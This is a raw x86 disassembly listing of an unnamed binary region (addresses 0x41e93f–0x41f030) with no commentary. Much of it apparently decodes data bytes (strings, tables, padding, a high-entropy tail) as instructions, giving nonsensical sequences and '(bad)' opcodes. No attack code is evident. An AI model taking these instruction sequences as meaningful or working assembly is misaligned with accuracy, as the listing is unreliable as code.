  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x59e0cf50
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [ebx-0x13fffffa],al
  41edc3:	fistp  WORD PTR [ebx-0x6f]
  41edc6:	cmp    BYTE PTR [ecx],dh
  41edc8:	xor    ebx,eax
  41edca:	mov    esi,0x5fcd5a70
  41edcf:	mov    DWORD PTR [ebx+0x604739ae],edi
  41edd5:	dec    edx
  41edd6:	(bad)  
  41edd7:	fbstp  TBYTE PTR [ebp+ebx*2-0x6ab4e212]
  41edde:	mov    eax,ds:0x387d2cc3
  41ede3:	stos   DWORD PTR es:[edi],eax
  41ede4:	mov    bh,0x3e
  41ede6:	pop    edi
  41ede7:	cmp    BYTE PTR [eax+edx*8+0x54252d1a],bh
  41edee:	cmc    
  41edef:	mov    cl,0xbd
  41edf1:	pop    esi
  41edf2:	cmp    ch,BYTE PTR [eax-0x70]
  41edf5:	mov    ebx,0x62696e01
  41edfa:	jmp    0x41ee36
  41edfc:	sbb    edi,eax
  41edfe:	xor    BYTE PTR [eax+0x6aa4f8ad],0xa3
  41ee05:	and    eax,0xc73dd63c
  41ee0a:	xchg   DWORD PTR [bx+si-0x4c92],ebx
  41ee0f:	mov    ds:0xf04361db,eax
  41ee14:	aaa    
  41ee15:	inc    ebx
  41ee16:	out    dx,al
  41ee17:	mov    ebp,edx
  41ee19:	mov    edi,DWORD PTR [ecx+edx*1+0x3bd632a1]
  41ee20:	or     DWORD PTR [ebp-0x5d8bb682],edi
  41ee26:	(bad)  
  41ee27:	jmp    0xb4120dbc
  41ee2c:	mov    edi,esp
  41ee2e:	cmc    
  41ee2f:	mov    es,ecx
  41ee31:	and    bh,dh
  41ee33:	enter  0xa9b1,0x9b
  41ee37:	leave  
  41ee38:	inc    esi
  41ee39:	call   0x7927f518
  41ee3e:	mov    esi,0x1a3cdf39
  41ee43:	pop    edx
  41ee44:	or     al,0xef
  41ee46:	pushf  
  41ee47:	mov    ebx,0x4168e67c
  41ee4c:	leave  
  41ee4d:	popf   
  41ee4e:	mov    DWORD PTR [ebx],edx
  41ee50:	sbb    esi,ecx
  41ee52:	cmc    
  41ee53:	mov    DWORD PTR [ebx],esi
  41ee55:	ss in  eax,dx
  41ee57:	sub    al,0x29
  41ee59:	sti    
  41ee5a:	pop    ds
  41ee5b:	daa    
  41ee5c:	mov    esi,0x2cf1aaec
  41ee61:	shl    BYTE PTR [esi],cl
  41ee63:	push   es
  41ee64:	fistp  QWORD PTR [edx-0x4728c845]
  41ee6a:	call   0x180f9942
  41ee6f:	test   DWORD PTR [esi],eax
  41ee71:	xor    ecx,DWORD PTR [edx+0x5435d0b5]
  41ee77:	adc    ah,BYTE PTR [eax]
  41ee79:	fimul  DWORD PTR [ecx-0x33]
  41ee7c:	rol    DWORD PTR [esi-0x3a],0x3a
  41ee80:	inc    edi
  41ee81:	xor    ebx,ebp
  41ee83:	fldcw  WORD PTR [eax-0x1b]
  41ee86:	jge    0x41ee90
  41ee88:	es repz leave 
  41ee8b:	dec    edi
  41ee8c:	push   ss
  41ee8d:	mov    ebx,DWORD PTR [ecx-0x58fa8685]
  41ee93:	call   0x197f:0x9599577f
  41ee9a:	cld    
  41ee9b:	sbb    al,0xb3
  41ee9d:	pop    ss
  41ee9e:	mov    eax,ds:0x46ac8689
  41eea3:	and    BYTE PTR [si],ah
  41eea6:	ins    BYTE PTR es:[edi],dx
  41eea7:	or     esi,edi
  41eea9:	scas   eax,DWORD PTR es:[edi]
  41eeaa:	bswap  eax
  41eeac:	adc    bh,bl
  41eeae:	hlt    
  41eeaf:	adc    bl,BYTE PTR [eax-0x39]
  41eeb2:	mov    ebx,0xfa0b3e1e
  41eeb7:	stos   DWORD PTR es:[edi],eax
  41eeb8:	and    cl,bh
  41eeba:	out    dx,eax
  41eebb:	fdivr  QWORD PTR [ebp-0x1ced6563]
  41eec1:	cld    
  41eec2:	dec    ecx
  41eec3:	mov    BYTE PTR [edx+0x22],al
  41eec6:	and    eax,0xbe4d3178
  41eecb:	pop    ebx
  41eecc:	push   0xc
  41eece:	fistp  QWORD PTR [esi]
  41eed0:	mov    ebp,esi
  41eed2:	lds    ebx,FWORD PTR [eax+eiz*8]
  41eed5:	sub    dh,0xd9
  41eed8:	sar    DWORD PTR [ebp-0x7da0d66c],cl
  41eede:	jmp    0x66b2b408
  41eee3:	ret    
  41eee4:	xor    BYTE PTR [edx+0x46812546],dh
  41eeea:	and    DWORD PTR gs:[ecx+0x2b0fb63],ebp
  41eef1:	fnstcw WORD PTR [esi+eiz*1+0x21]
  41eef5:	xor    edi,DWORD PTR ds:0xc1b9accb
  41eefb:	cmc    
  41eefc:	stos   DWORD PTR es:[edi],eax
  41eefd:	push   ecx
  41eefe:	(bad)  
  41eeff:	test   BYTE PTR [ecx],ch
  41ef01:	repz mov esp,DWORD PTR [esi+eiz*2]
  41ef05:	pop    ebx
  41ef06:	imul   esi,DWORD PTR [ebx+eiz*2],0xffffff93
  41ef0a:	aad    0xe1
  41ef0c:	fild   QWORD PTR [ebp+0x7d]
  41ef0f:	mov    cl,0x55
  41ef11:	in     al,0x36
  41ef13:	xchg   bh,dl
  41ef15:	jl     0x41ee97
  41ef17:	and    eax,0x41c6858b
  41ef1c:	pop    ds
  41ef1d:	test   BYTE PTR [ebx+0x767b0392],ch
  41ef23:	pop    edx
  41ef24:	fst    QWORD PTR [eax+0x34]
  41ef27:	xor    al,0x8f
  41ef29:	imul   esi,DWORD PTR [eax],0x7a
  41ef2c:	icebp  
  41ef2d:	aas    
  41ef2e:	fld    TBYTE PTR [esi+0x3f]
  41ef31:	push   ebp
  41ef32:	outs   dx,BYTE PTR ds:[esi]
  41ef33:	cli    
  41ef34:	into   
  41ef35:	add    al,0xa8
  41ef37:	cmc    
  41ef38:	add    DWORD PTR [edi-0x1b3e185a],0x1e74571d
  41ef42:	lods   eax,DWORD PTR ds:[esi]
  41ef43:	(bad)  
  41ef44:	pop    esi
  41ef45:	add    ecx,ecx
  41ef47:	(bad)  
  41ef48:	loope  0x41ef51
  41ef4a:	jbe    0x41ef4b
  41ef4c:	jb     0x41ef7b
  41ef4e:	mov    ecx,0x693fe0dd
  41ef53:	adc    BYTE PTR [di-0x100f],dh
  41ef58:	add    eax,ebx
  41ef5a:	dec    esi
  41ef5b:	sbb    BYTE PTR [ecx],0xaa
  41ef5e:	out    dx,eax
  41ef5f:	pop    ebp
  41ef60:	imul   eax,DWORD PTR [edx+0x51],0x18baf221
  41ef67:	aaa    
  41ef68:	xor    BYTE PTR [edx],0x82
  41ef6b:	lea    ebx,[ebp+0x2c22e85d]
  41ef71:	xchg   BYTE PTR [ebx+edx*8+0x62],dh
  41ef75:	xchg   ebx,eax
  41ef76:	ins    DWORD PTR es:[edi],dx
  41ef77:	or     BYTE PTR [ecx-0x47],bh
  41ef7a:	(bad)  
  41ef7b:	fcmovnb st,st(4)
  41ef7d:	push   esp
  41ef7e:	retf   
  41ef7f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41ef81:	inc    edi
  41ef82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef83:	loop   0x41efa9
  41ef85:	fisttp DWORD PTR [edi]
  41ef87:	cld    
  41ef88:	push   0xffffffee
  41ef8a:	pop    eax
  41ef8b:	call   0x29ba:0x7518b964
  41ef92:	fbld   TBYTE PTR [edx-0x56c759a9]
  41ef98:	(bad)  
  41ef99:	rcr    BYTE PTR [ebx+0x34],0xac
  41ef9d:	dec    edx
  41ef9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef9f:	les    esi,FWORD PTR [ecx+0x359efda5]
  41efa5:	push   0xb
  41efa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efa8:	es jmp 0x2dd70d4
  41efae:	dec    edx
  41efaf:	pop    es
  41efb0:	jbe    0x41ef3e
  41efb2:	push   ebp
  41efb3:	adc    al,0x84
  41efb5:	push   esp
  41efb6:	(bad)  
  41efb7:	cld    
  41efb8:	xchg   BYTE PTR [ebx+0x4c],dh
  41efbb:	push   eax
  41efbc:	mov    bl,dl
  41efbe:	jns    0x41efed
  41efc0:	into   
  41efc1:	adc    ecx,DWORD PTR [ebp-0x44]
  41efc4:	sub    DWORD PTR [ebp-0x9],ebx
  41efc7:	jge    0x41f00b
  41efc9:	pop    esp
  41efca:	(bad)  
  41efcb:	iret   
  41efcc:	mov    esi,0x5d93ac74
  41efd1:	jne    0x41f019
  41efd3:	add    eax,0x7d17360a
  41efd8:	mov    bl,al
  41efda:	mov    bh,0x84
  41efdc:	pusha  
  41efdd:	jg     0x41ef74
  41efdf:	retf   
  41efe0:	mov    dh,0x5b
  41efe2:	adc    edi,DWORD PTR [edi+0x67f5633e]
  41efe8:	scas   al,BYTE PTR es:[edi]
  41efe9:	sti    
  41efea:	repnz hlt 
  41efec:	fbstp  TBYTE PTR [edx-0x5f]
  41efef:	sbb    al,0x94
  41eff1:	int3   
  41eff2:	leave  
  41eff3:	xchg   edi,eax
  41eff4:	jecxz  0x41efa4
  41eff6:	lods   eax,DWORD PTR ds:[esi]
  41eff7:	inc    esi
  41eff8:	sbb    esp,DWORD PTR [edi]
  41effa:	shl    ah,1
  41effc:	mov    ebx,0xae48f7b2
  41f001:	mov    ds:0x6e1755fa,al
  41f006:	jmp    0x8750:0x3f0132d
  41f00d:	jl     0x41efee
  41f00f:	sub    bl,BYTE PTR [ebp-0xa]
  41f012:	cmp    al,0xc
  41f014:	pop    eax
  41f015:	push   edx
  41f016:	call   0xbe50:0x52df9368
  41f01d:	jnp    0x41efcb
  41f01f:	cmp    DWORD PTR ds:0x95c06bd0,ebx
  41f025:	out    dx,eax
  41f026:	sub    al,0x22
  41f028:	call   0x3ec25c
  41f02d:	jb     0x41f022
  41f02f:	cmc    
  41f030:	outs   dx,DWORD PTR ds:[esi]
